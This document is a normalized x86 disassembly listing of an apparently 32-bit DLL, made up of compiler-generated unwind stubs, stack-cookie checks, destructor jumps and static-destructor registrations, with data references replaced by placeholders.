jmp sub_10029c40
sub_1008338b
lea ecx [ ebp - 0x180 ]
jmp sub_10061060
sub_10083396
lea ecx [ ebp - 0x164 ]
jmp sub_10061060
sub_100833a1
lea ecx [ ebp - 0x19c ]
jmp sub_10061060
sub_100833ac
lea ecx [ ebp - 0x12c ]
jmp sub_10029c40
sub_100833b7
lea ecx [ ebp - 0x12c ]
jmp sub_10029c40
sub_100833c2
lea ecx [ ebp - 0x12c ]
jmp sub_10029c40
sub_100833cd
lea ecx [ ebp - 0x12c ]
jmp sub_10029c40
sub_100833d8
lea ecx [ ebp - 0x12c ]
jmp sub_10029c40
sub_100833e3
lea ecx [ ebp - 0x30 ]
jmp sub_10029c40
sub_100833eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1e4 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083420
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10083428
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083450
lea ecx [ ebp - 0x148 ]
jmp sub_10061060
sub_1008345b
lea esi [ ebp - 0x194 ]
jmp sub_10061020
sub_10083466
lea ecx [ ebp - 0x34 ]
jmp sub_10061060
sub_1008346e
lea ecx [ ebp - 0x164 ]
jmp sub_10029c40
sub_10083479
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_10083481
lea ecx [ ebp - 0x34 ]
jmp sub_10061060
sub_10083489
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_10083491
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_10083499
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_100834a1
lea ecx [ ebp - 0x34 ]
jmp sub_10029c40
sub_100834a9
lea ecx [ ebp - 0x34 ]
jmp sub_10061060
sub_100834b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1a8 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100834e0
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100834e8
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_100834f0
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_100834fb
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10083503
lea ecx [ ebp - 0xa0 ]
jmp sub_10061060
sub_1008350e
lea ebx [ ebp - 0xb8 ]
jmp sub_1006c7f0
sub_10083519
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083550
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
pop ecx
retn
sub_1008355b
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
pop ecx
retn
sub_10083566
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
pop ecx
retn
sub_10083571
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
pop ecx
retn
sub_1008357c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100835a0
mov eax [ ebp - 0x278 ]
jmp sub_10040d90
sub_100835ab
lea eax [ ebp - 0x268 ]
jmp sub_10044190
sub_100835b6
lea eax [ ebp - 0x270 ]
jmp sub_10044190
sub_100835c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x27c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100835f0
mov eax [ ebp - 0x238 ]
jmp sub_10040d90
sub_100835fb
lea eax [ ebp - 0x23c ]
jmp sub_10044190
sub_10083606
lea eax [ ebp - 0x244 ]
jmp sub_10044190
sub_10083611
lea ecx [ ebp - 0x234 ]
jmp sub_10029c40
sub_1008361c
lea ecx [ ebp - 0x234 ]
jmp sub_10029c40
sub_10083627
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083650
mov eax [ ebp - 0x430 ]
jmp sub_10040d90
sub_1008365b
lea ebx [ ebp - 0x440 ]
jmp sub_1006c7f0
sub_10083666
lea esi [ ebp - 0x98 ]
jmp sub_10054dd0
sub_10083671
lea esi [ ebp - 0x198 ]
jmp sub_10054dd0
sub_1008367c
lea esi [ ebp - 0x298 ]
jmp sub_10054dd0
sub_10083687
lea esi [ ebp - 0x398 ]
jmp sub_10054dd0
sub_10083692
lea esi [ ebp - 0x218 ]
jmp sub_10054dd0
sub_1008369d
lea esi [ ebp - 0x118 ]
jmp sub_10054dd0
sub_100836a8
lea esi [ ebp - 0x318 ]
jmp sub_10054dd0
sub_100836b3
lea esi [ ebp - 0x418 ]
jmp sub_10054dd0
sub_100836be
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x444 ]
mov ecx [ edx - 0x448 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100836f0
lea ecx [ ebp - 0x2b8 ]
jmp sub_10061060
sub_100836fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c8 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083730
lea esi [ ebp - 0x90 ]
jmp sub_1005e450
sub_1008373b
lea eax [ ebp - 0x46c ]
push eax
call sub_100024e0
retn
sub_10083748
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x478 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083770
lea ecx [ ebp - 0x30 ]
jmp sub_10029c40
sub_10083778
lea esi [ ebp - 0x64 ]
jmp sub_10028360
sub_10083780
lea esi [ ebp - 0x54 ]
jmp sub_1005e450
sub_10083788
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100837b0
lea ecx [ ebp - 0xbc ]
jmp sub_10029c40
sub_100837bb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100837f0
lea esi [ ebp - 0x498 ]
jmp sub_10028360
sub_100837fb
lea esi [ ebp - 0x47c ]
jmp sub_1005e450
sub_10083806
lea eax [ ebp - 0x504 ]
jmp sub_100542e0
sub_10083811
lea ecx [ ebp - 0x458 ]
jmp sub_10029c40
sub_1008381c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x508 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083850
lea esi [ ebp - 0x304 ]
jmp sub_1002abe0
sub_1008385b
lea esi [ ebp - 0x318 ]
jmp sub_10028360
sub_10083866
lea esi [ ebp - 0x298 ]
jmp sub_1005e450
sub_10083871
lea eax [ ebp - 0x2f0 ]
jmp sub_100542e0
sub_1008387c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x324 ]
mov ecx [ edx - 0x328 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100838b0
lea esi [ ebp - 0x30c ]
jmp sub_10028360
sub_100838bb
lea esi [ ebp - 0x298 ]
jmp sub_1005e450
sub_100838c6
lea eax [ ebp - 0x2f0 ]
jmp sub_100542e0
sub_100838d1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x31c ]
mov ecx [ edx - 0x320 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083900
lea esi [ ebp - 0x310 ]
jmp sub_10028360
sub_1008390b
lea eax [ ebp - 0x2f0 ]
jmp sub_100542e0
sub_10083916
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x324 ]
mov ecx [ edx - 0x328 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083950
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1008395e
mov ecx rw-data
jmp sub_10029c40
sub_10083968
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083990
lea ecx [ ebp - 0x60 ]
jmp sub_10029c40
sub_10083998
lea edi [ ebp - 0x68 ]
jmp sub_1005bb10
sub_100839a0
lea edi [ ebp - 0x68 ]
jmp sub_1005bb10
sub_100839a8
lea edi [ ebp - 0x68 ]
jmp sub_1005bb10
sub_100839b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100839e0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100839ee
mov ecx rw-data
jmp sub_10029c40
sub_100839f8
lea ecx [ ebp - 0x84 ]
jmp sub_10029c40
sub_10083a03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2ec ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083a30
lea esi [ ebp - 0x570 ]
jmp sub_10022210
sub_10083a3b
lea ecx [ ebp - 0x58c ]
jmp sub_10061060
sub_10083a46
lea ecx [ ebp - 0x510 ]
jmp sub_10061060
sub_10083a51
lea ecx [ ebp - 0x52c ]
jmp sub_10061060
sub_10083a5c
lea ecx [ ebp - 0x4f4 ]
jmp sub_10061060
sub_10083a67
mov eax [ ebp - 0x594 ]
push eax
call sub_1006591f
pop ecx
retn
sub_10083a75
lea ecx [ ebp - 0x52c ]
jmp sub_10061060
sub_10083a80
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x594 ]
mov ecx [ edx - 0x598 ]
xor ecx eax
call sub_10024145
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083ab0
mov ecx rw-data
jmp sub_10029c40
sub_10083aba
mov ecx rw-data
jmp sub_10029c40
sub_10083ac4
mov ecx rw-data
jmp sub_10029c40
sub_10083ace
mov ecx rw-data
jmp sub_10029c40
sub_10083ad8
mov ecx rw-data
jmp sub_10029c40
sub_10083ae2
mov esi rw-data
jmp sub_10059ff0
sub_10083aec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10083b10
call sub_10041cc0
push sub_10084170
call sub_100662c2
pop ecx
retn
sub_10083e70
mov [ rw-data ] 0x0
retn
sub_10083e80
push sub_100843b0
call sub_100662c2
pop ecx
retn
sub_10083e90
push 0x0
push r--data
mov ecx rw-data
call sub_10043190
push sub_100841a0
call sub_100662c2
pop ecx
retn
sub_10083eb0
push 0x0
push r--data
mov ecx rw-data
call sub_10043190
push sub_100841d0
call sub_100662c2
pop ecx
retn
sub_10083ed0
push 0x0
push r--data
mov ecx rw-data
call sub_10043190
push sub_10084200
call sub_100662c2
pop ecx
retn
sub_100840e9
push sub_10084417
call sub_100662c2
pop ecx
retn
sub_100840f5
push sub_10084422
call sub_100662c2
pop ecx
retn
sub_10084101
push sub_1008442d
call sub_100662c2
pop ecx
retn
sub_1008410d
push sub_10084442
call sub_100662c2
pop ecx
retn
sub_10084119
push sub_10084438
call sub_100662c2
pop ecx
retn
sub_10084125
mov ecx rw-data
call sub_10041d8e
push sub_1008444c
call sub_100662c2
pop ecx
retn
sub_1008413b
mov ecx rw-data
call sub_10041d8e
push sub_1008447e
call sub_100662c2
pop ecx
retn
sub_10084151
push sub_10084488
call sub_100662c2
pop ecx
retn
sub_10084160
push r-xdata
call sub_100662c2
pop ecx
retn
sub_10084170
mov ecx rw-data
jmp sub_1006b090
j_sub_10041c10
jmp sub_10041c10
j_sub_10048db0
jmp sub_10048db0
sub_100841a0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x4
sub_100841d0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x4
sub_10084200
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x4
sub_10084403
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10005296
sub_10084417
mov [ rw-data ] r--data
retn
sub_10084422
mov [ rw-data ] r--data
retn
sub_1008442d
mov [ rw-data ] r--data
retn
sub_10084438
mov ecx rw-data
jmp sub_10069ce0
sub_10084442
mov ecx rw-data
jmp sub_10036a29
sub_1008444c
mov ecx rw-data
jmp sub_10017e08
sub_10084456
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10005296
sub_1008446a
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10005296
sub_1008447e
mov ecx rw-data
jmp sub_10017e08
sub_10084488
mov ecx rw-data
jmp sub_10037f51
